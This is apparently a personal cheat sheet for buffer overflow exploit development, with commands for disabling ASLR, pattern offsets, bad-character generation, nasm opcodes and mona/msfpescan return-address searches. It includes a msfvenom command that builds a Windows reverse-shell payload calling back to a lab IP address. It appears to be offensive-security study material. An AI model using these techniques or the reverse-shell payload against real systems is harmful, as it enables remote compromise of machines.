# Buffer Overflow

## ASLR Bypass
```sh
# Deactivate
┌──(grenierdev㉿kali)-[~]
└─$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

# Activate
┌──(grenierdev㉿kali)-[~]
└─$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
2
```

## Non-repeating 4-byte chunks
```sh
# Generate
┌──(grenierdev㉿kali)-[~]
└─$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Query offset of pattern `63413563`
┌──(grenierdev㉿kali)-[~]
└─$ msf-pattern_offset -l 100 -q 63413563
[*] Exact match at offset 76
```
```python
# Generate with python
import math
from itertools import product, islice

size = 10
payload = ''.join(list(sum(islice(product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"), 0, math.ceil(size / 3)), ())))[:size]
```

## Generate bad characters
```python
#!/bin/python3

badchars = [x for x in range(1, 256)]

with open("exploit-bad.txt", "wb") as f:
	f.write(bytes(badchars))
```

## NASM

```sh
# Single instruction at a time
┌──(grenierdev㉿kali)-[~]
└─$ msf-nasm_shell
nasm > sub esp,178
00000000  81ECB2000000      sub esp,0xb2
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 

# With full instructions
┌──(grenierdev㉿kali)-[~]
└─$ test.asm
BITS 32

sub		esp, 178
jmp		esp

┌──(grenierdev㉿kali)-[~]
└─$ nasm redirect.asm; xxd redirect
00000000: 81ec b200 0000 ffe4                      ........
```

## NOP Sled (NOP padding)

```sh
# Generate payload and prepend 20 NOP opcode to prevent mangling with the ESP reguster
┌──(grenierdev㉿kali)-[~]
└─$ $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.190 LPORT=4444 -f raw -b "\x00\0a\x0d" -n 20 -o code.txt
```

## mona

Site: https://github.com/corelan/mona

> Mona.py is a python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform).

```sh
# Help
!mona help

# Show loaded modules
!mona modules

# Show modules without ASLR
!mona noaslr

# Find opcode within module
!mona find -s "\xff\xe4" -m "libspp.dll"

# Find jump esp opcode
!mona jmp -r esp -m "libspp.dll"
```

## msfpescan

Site: https://www.offensive-security.com/metasploit-unleashed/exploit-targets/

> Scan for a return address in PE files

```sh
┌──(grenierdev㉿kali)-[~]
└─$ msfpescan -p umpnpmgr.dll
[targetos.umpnpmgr.dll]
0x79001567 pop eax; pop esi; ret
0x79011e0b pop eax; pop esi; retn 0x0008
0x79012749 pop esi; pop ebp; retn 0x0010
0x7901285c pop edi; pop esi; retn 0x0004
```